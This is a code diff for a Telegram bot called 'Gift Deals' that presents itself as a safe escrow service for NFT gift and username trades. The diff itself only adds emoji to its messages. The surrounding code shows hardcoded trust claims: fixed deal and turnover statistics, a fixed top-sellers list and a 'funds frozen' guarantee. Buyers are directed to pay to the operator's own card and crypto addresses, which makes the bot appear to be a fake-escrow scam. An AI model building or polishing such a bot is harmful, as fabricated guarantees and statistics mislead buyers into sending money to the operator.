@@ -59,6 +59,19 @@ E_DEALS_ICON  = ce("5188344996356448758","🏆")
 E_TURN_ICON   = ce("5424976816530014958","💰")
 E_REV_ICON    = ce("5028746137645876535","📊")
 
+# Дополнительные премиум эмодзи для текстов
+E_SHIELD2 = ce("5447414070593739764","🛡")
+E_FIRE    = ce("5373100545224608922","🔥")
+E_CROWN   = ce("5392699498427405578","👑")
+E_LOCK    = ce("5472124911399807202","🔒")
+E_OK      = ce("5206607081334906820","✅")
+E_GIFT    = ce("5373163891218598706","🎁")
+E_ROCKET  = ce("5381072436286190944","🚀")
+E_PERCENT = ce("5407025283456835900","💸")
+E_HAND    = ce("5469654973308476699","🤜")
+E_CARD2   = ce("5471952986678738719","💳")
+E_PHONE   = ce("5393556898287866251","📱")
+
 TNAMES_RU = {
     "nft": f"{E_NFT} NFT подарок",
     "username": f"{E_USER} NFT Username",
@@ -323,10 +336,11 @@ def get_welcome(lang):
         intro="Gift Deals — the safest platform for deals in Telegram"
         footer="Choose an action below"; stats="6500+ deals · $48,200 turnover"
     nums=[E_NUM1,E_NUM2,E_NUM3,E_NUM4]
-    lines="\n".join(f"<blockquote><b>{nums[i]} {pts[i]}.</b></blockquote>" for i in range(4))
-    return (f"{E_WELCOME} <b>{intro}</b>\n\n{lines}\n\n"
-            f"<blockquote><b>{E_STATS} {stats}</b></blockquote>\n\n"
-            f"{E_SPARK} <b>{footer}</b>")
+    icons=[E_GIFT,E_SHIELD2,E_LOCK,E_JOIN]
+    lines="\n".join(f"<blockquote><b>{nums[i]} {icons[i]} {pts[i]}.</b></blockquote>" for i in range(4))
+    return (f"{E_CROWN} <b>{intro}</b>\n\n{lines}\n\n"
+            f"<blockquote><b>{E_FIRE} {stats}</b></blockquote>\n\n"
+            f"{E_ROCKET} <b>{footer}</b>")
 
 # ─── Deal card builder ────────────────────────────────────────────────────────
 def build_deal_text(deal_id, d, creator_tag, partner_tag, lang, joined=False):
@@ -377,15 +391,15 @@ def build_deal_text(deal_id, d, creator_tag, partner_tag, lang, joined=False):
         cur_display=CUR_PLAIN.get(cur,cur)
 
         lines=[
-            f"{E_CHECK} <b>{R(ru,'Сделка','Deal')}</b>\n",
-            f"<b>{R(ru,'Тип','Type')}:</b> {tname(dtype,lang)}{item}",
-            f"<b>{R(ru,'Сумма','Amount')}:</b> {amt} {cur_display}\n",
+            f"{E_OK} <b>{R(ru,'Сделка','Deal')}</b>\n",
+            f"{E_GIFT} <b>{R(ru,'Тип','Type')}:</b> {tname(dtype,lang)}{item}",
+            f"{E_MONEY} <b>{R(ru,'Сумма','Amount')}:</b> {amt} {cur_display}\n",
             f"{E_SELLER_ICON} <b>{lbl_creator}:</b> {creator_tag}",
             f"<blockquote>{stats_block(creator_uid)}</blockquote>\n",
             f"{E_BUYER_ICON} <b>{lbl_partner}:</b> {partner_tag}",
             f"<blockquote>{stats_block(partner_uid)}</blockquote>\n",
-            f"{E_SEC} <b>{R(ru,'Гарантия безопасности','Security Guarantee')}</b>",
-            f"<blockquote>{R(ru,'Средства заморожены до подтверждения. Сделка защищена Gift Deals.','Funds frozen until confirmation. Deal protected by Gift Deals.')}</blockquote>\n",
+            f"{E_SHIELD2} <b>{R(ru,'Гарантия безопасности','Security Guarantee')}</b>",
+            f"<blockquote>{E_LOCK} {R(ru,'Средства заморожены до подтверждения. Сделка защищена Gift Deals.','Funds frozen until confirmation. Deal protected by Gift Deals.')}</blockquote>\n",
             f"{E_WARN} <b>{R(ru,'Важно','Important')}:</b>",
             f"<blockquote>{note}</blockquote>",
         ]
@@ -393,15 +407,15 @@ def build_deal_text(deal_id, d, creator_tag, partner_tag, lang, joined=False):
         # Реквизиты показываем только если второй участник присоединился
         if joined:
             lines += [
-                f"\n{E_REQ} <b>{'СБП / Карта' if ru else 'CARD / PHONE'} {CARD_BANK}:</b>",
-                f"<blockquote>{R(ru,'Телефон','Phone')}: <code>{CARD_NUM}</code>\n{R(ru,'Получатель','Recipient')}: {CARD_NAME}</blockquote>\n",
+                f"\n{E_CARD2} <b>{'СБП / Карта' if ru else 'CARD / PHONE'} {CARD_BANK}:</b>",
+                f"<blockquote>{E_PHONE} {R(ru,'Телефон','Phone')}: <code>{CARD_NUM}</code>\n{R(ru,'Получатель','Recipient')}: {CARD_NAME}</blockquote>\n",
                 f"{E_TON} <b>TON:</b>",
                 f"<blockquote><code>{CRYPTO_ADDR}</code></blockquote>\n",
                 f"{E_DIAMOND} <b>USDT / Crypto:</b>",
                 f"<blockquote>{E_CBOT} {CRYPTO_BOT}</blockquote>\n",
                 f"{E_STAR2} <b>{R(ru,'Звёзды / NFT','Stars / NFT')}:</b>",
                 f"<blockquote>{MANAGER_TAG}</blockquote>\n",
-                f"{E_CHECK} {R(ru,'После перевода нажмите «Я оплатил»','After payment press «I paid»')}",
+                f"{E_OK} {R(ru,'После перевода нажмите «Я оплатил»','After payment press «I paid»')}",
             ]
         else:
             lines.append(f"\n{E_SPARK} <b>{R(ru,'Ожидание второго участника...','Waiting for second participant...')}</b>")
@@ -1136,19 +1150,17 @@ async def show_balance(update, context):
         # Реквизиты для пополнения (куда переводить)
         lines=[
             f"{E_WALLET} <b>{R(ru,'Пополнить / Вывод','Top Up / Withdraw')}</b>\n",
-            f"<b>{R(ru,'Баланс','Balance')}: {bal} RUB</b>\n",
-            f"{E_REQ} <b>{R(ru,'Для пополнения переводите на:','Top up by sending to:')}</b>",
-            f"<blockquote>{R(ru,'Карта / Телефон','Card / Phone')} ({CARD_BANK}):\n<code>{CARD_NUM}</code>\n{R(ru,'Получатель','Recipient')}: {CARD_NAME}</blockquote>",
+            f"{E_BAL} <b>{R(ru,'Баланс','Balance')}: {bal} RUB</b>\n",
+            f"{E_CARD2} <b>{R(ru,'Для пополнения переводите на:','Top up by sending to:')}</b>",
+            f"<blockquote>{E_PHONE} {R(ru,'Карта / Телефон','Card / Phone')} ({CARD_BANK}):\n<code>{CARD_NUM}</code>\n{R(ru,'Получатель','Recipient')}: {CARD_NAME}</blockquote>",
             f"<blockquote>{E_TON} TON:\n<code>{CRYPTO_ADDR}</code></blockquote>",
             f"<blockquote>{E_DIAMOND} USDT:\n{E_CBOT} {CRYPTO_BOT}</blockquote>",
             f"<blockquote>{E_STAR2} {R(ru,'Звёзды','Stars')}: {MANAGER_TAG}</blockquote>",
+            f"\n{E_REQ} <b>{R(ru,'Мои реквизиты (для вывода):','My requisites (for withdrawal):')}</b>",
+            f"<blockquote>{E_CARD2} {R(ru,'Карта/Телефон','Card/Phone')}: {card if card else R(ru,'не добавлена','not set')}</blockquote>",
+            f"<blockquote>{E_TON} TON: {ton[:20]+'...' if ton else R(ru,'не добавлен','not set')}</blockquote>",
+            f"<blockquote>{E_STAR2} {R(ru,'Звёзды','Stars')}: {stars if stars else R(ru,'не добавлен','not set')}</blockquote>",
         ]
-
-        # Реквизиты пользователя
-        lines.append(f"\n{E_REQ} <b>{R(ru,'Мои реквизиты (для вывода):','My requisites (for withdrawal):')}</b>")
-        lines.append(f"<blockquote>💳 {R(ru,'Карта/Телефон','Card/Phone')}: {card if card else R(ru,'не добавлена','not set')}</blockquote>")
-        lines.append(f"<blockquote>{E_TON} TON: {ton[:20]+'...' if ton else R(ru,'не добавлен','not set')}</blockquote>")
-        lines.append(f"<blockquote>{E_STAR2} {R(ru,'Звёзды','Stars')}: {stars if stars else R(ru,'не добавлен','not set')}</blockquote>")
 
         await send_section(update,"\n".join(lines),
             InlineKeyboardMarkup([
@@ -1207,11 +1219,11 @@ async def show_profile(update, context):
         if reviews:
             rv_lines="\n".join(f"{i+1}. {r}" for i,r in enumerate(reviews[-10:]))
             rv=f"\n\n<b>{R(ru,'Отзывы','Reviews')}:</b>\n<blockquote>{rv_lines}</blockquote>"
-        text=(f"{E_USER} <b>{R(ru,'Профиль','Profile')}</b>{sl}\n\n"
-              f"@{uname}\n"
+        text=(f"{E_CROWN} <b>{R(ru,'Профиль','Profile')}</b>{sl}\n\n"
+              f"{E_USER} @{uname}\n"
               f"{E_BAL} {R(ru,'Баланс','Balance')}: <b>{u.get('balance',0)} RUB</b>\n"
               f"{E_STATS} {R(ru,'Сделок','Deals')}: <b>{u.get('total_deals',0)}</b>\n"
-              f"{E_CHECK} {R(ru,'Успешных','Successful')}: <b>{u.get('success_deals',0)}</b>\n"
+              f"{E_OK} {R(ru,'Успешных','Successful')}: <b>{u.get('success_deals',0)}</b>\n"
               f"{E_TURN_ICON} {R(ru,'Оборот','Turnover')}: <b>{u.get('turnover',0)} RUB</b>\n"
               f"{E_TROPHY} {R(ru,'Репутация','Reputation')}: <b>{u.get('reputation',0)}</b>{rv}")
         await send_section(update,text,InlineKeyboardMarkup([
@@ -1229,10 +1241,10 @@ async def show_ref(update, context):
         refs_str=""
         if refs: refs_str="\n\n"+R(ru,"Рефералы","Referrals")+":\n"+"\n".join(f"• @{r}" if r and r!="?" else "• #?" for r in refs[-10:])
         text=(f"{E_JOIN} <b>{R(ru,'Реферальная программа','Referral Program')}</b>\n\n"
-              f"<blockquote>{R(ru,'Приглашайте друзей — 3% с каждой их сделки!','Invite friends — 3% from each deal!')}\n\n"
-              f"{R(ru,'Приглашено','Invited')}: <b>{rc}</b>\n"
-              f"{R(ru,'Заработано','Earned')}: <b>{re} RUB</b>{refs_str}</blockquote>\n\n"
-              f"{R(ru,'Ваша ссылка:','Your link:')}\n<code>{ref_link}</code>")
+              f"<blockquote>{E_PERCENT} {R(ru,'Приглашайте друзей — 3% с каждой их сделки!','Invite friends — 3% from each deal!')}\n\n"
+              f"{E_USER} {R(ru,'Приглашено','Invited')}: <b>{rc}</b>\n"
+              f"{E_BAL} {R(ru,'Заработано','Earned')}: <b>{re} RUB</b>{refs_str}</blockquote>\n\n"
+              f"{E_SPARK} {R(ru,'Ваша ссылка:','Your link:')}\n<code>{ref_link}</code>")
         await send_section(update,text,InlineKeyboardMarkup([[InlineKeyboardButton("🔙 "+R(ru,"Назад","Back"),callback_data="main_menu")]]),section="ref")
     except Exception as e: logger.error(f"show_ref: {e}")
 
@@ -1246,7 +1258,7 @@ async def show_req(update, context):
         lines=[f"{E_REQ} <b>{R(ru,'Мои реквизиты','My Requisites')}</b>\n"]
 
         # Карта/Телефон
-        lines.append(f"💳 <b>{R(ru,'Карта / Телефон','Card / Phone')} ({CARD_BANK}):</b>")
+        lines.append(f"{E_CARD2} <b>{R(ru,'Карта / Телефон','Card / Phone')} ({CARD_BANK}):</b>")
         if card:
             lines.append(f"<blockquote><code>{card}</code></blockquote>")
         else:
@@ -1306,7 +1318,7 @@ async def show_my_deals(update, context):
         if not deals:
             await send_section(update,f"{E_DEAL} <b>{R(ru,'Мои сделки','My Deals')}\n\n{R(ru,'Пока нет сделок.','No deals yet.')}</b>",
                 InlineKeyboardMarkup([[InlineKeyboardButton("🔙 "+R(ru,"Назад","Back"),callback_data="main_menu")]]),section="my_deals"); return
-        SNAMES={"pending":R(ru,"⏳ Ожидает","⏳ Pending"),"confirmed":R(ru,"✅ Завершена","✅ Completed")}
+        SNAMES={"pending":R(ru,f"{E_SPARK} Ожидает",f"{E_SPARK} Pending"),"confirmed":R(ru,f"{E_OK} Завершена",f"{E_OK} Completed")}
         lines=[f"{E_DEAL} <b>{R(ru,'Мои сделки','My Deals')} ({len(deals)}):</b>\n"]
         for i,(did,dv) in enumerate(list(deals.items())[-10:],start=1):
             tn=tname(dv.get("type",""),lang)
@@ -1328,10 +1340,10 @@ async def show_top(update, context):
         ]
         medals=["🥇","🥈","🥉"]+[f"{E_TROPHY}"]*7
         dw=R(ru,"сделок","deals")
-        lines=[f"{E_TROPHY} <b>{R(ru,'Топ продавцов Gift Deals','Gift Deals Top Sellers')}</b>\n"]
+        lines=[f"{E_CROWN} <b>{R(ru,'Топ продавцов Gift Deals','Gift Deals Top Sellers')}</b>\n"]
         for i,(u2,a,dd) in enumerate(TOP):
             lines.append(f"<b>{medals[i]} {i+1}. {u2} — ${a} · {dd} {dw}</b>")
-        lines.append(f"\n{E_STATS} <b>{R(ru,'6500+ сделок · оборот $48,200','6500+ deals · $48,200 turnover')}</b>")
+        lines.append(f"\n{E_FIRE} <b>{R(ru,'6500+ сделок · оборот $48,200','6500+ deals · $48,200 turnover')}</b>")
         await send_section(update,"\n".join(lines),
             InlineKeyboardMarkup([[InlineKeyboardButton("🔙 "+R(ru,"Назад","Back"),callback_data="main_menu")]]),section="top")
     except Exception as e: logger.error(f"show_top: {e}")
@@ -1353,7 +1365,7 @@ async def show_withdraw(update, context):
         else: rows.append([InlineKeyboardButton(f"{E_REQ} {R(ru,'На карту/телефон','Card/Phone')}",callback_data="withdraw_card")])
         rows.append([InlineKeyboardButton("🔙 "+R(ru,"Назад","Back"),callback_data="menu_balance")])
         await send_section(update,
-            f"{E_WALLET} <b>{R(ru,'Вывод средств','Withdraw')}</b>\n\n<blockquote>{R(ru,'Баланс','Balance')}: {bal} RUB\n\n{R(ru,'Выберите способ:','Choose method:')}</blockquote>",
+            f"{E_WALLET} <b>{R(ru,'Вывод средств','Withdraw')}</b>\n\n<blockquote>{E_BAL} {R(ru,'Баланс','Balance')}: {bal} RUB\n\n{E_SPARK} {R(ru,'Выберите способ:','Choose method:')}</blockquote>",
             InlineKeyboardMarkup(rows),section="balance")
     except Exception as e: logger.error(f"show_withdraw: {e}")
 
